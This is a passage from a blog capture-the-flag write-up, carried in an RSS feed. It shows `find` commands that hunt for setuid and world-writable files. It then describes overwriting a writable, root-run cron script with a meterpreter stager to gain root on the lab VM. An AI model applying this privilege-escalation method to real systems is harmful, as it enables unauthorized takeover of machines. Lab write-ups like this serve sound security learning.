&lt;pre&gt;&lt;code class=&#34;language-bash.prettyprint&#34;&gt;find / --perm 6000
find / --perm 0777
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are! It&amp;rsquo;s a long list but 1 stands out: &lt;code&gt;/lib/log/cleaner.py&lt;/code&gt; The contents of the file looks
like it wipes the &lt;code&gt;/tmp&lt;/code&gt; directory. This must be the file that &lt;code&gt;cron&lt;/code&gt; runs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2113:54:51.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Thank goodness it&amp;rsquo;s writable ;) I I start a meterpreter listener and replace the &lt;code&gt;cleaner.py&lt;/code&gt; contents with a
stager.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2114:03:47.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Since the owner of the &lt;code&gt;cleaner.py&lt;/code&gt; file was root, and the meterpreter stager was now the contents of the
file&amp;hellip;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2114:04:41.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can take a look at the cron jobs to see what was trolling us and also at the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;images/Screenshot2016-10-2114:11:12.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;There we have it! This was so fun! CTF VMs have completely replaced video games for me.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>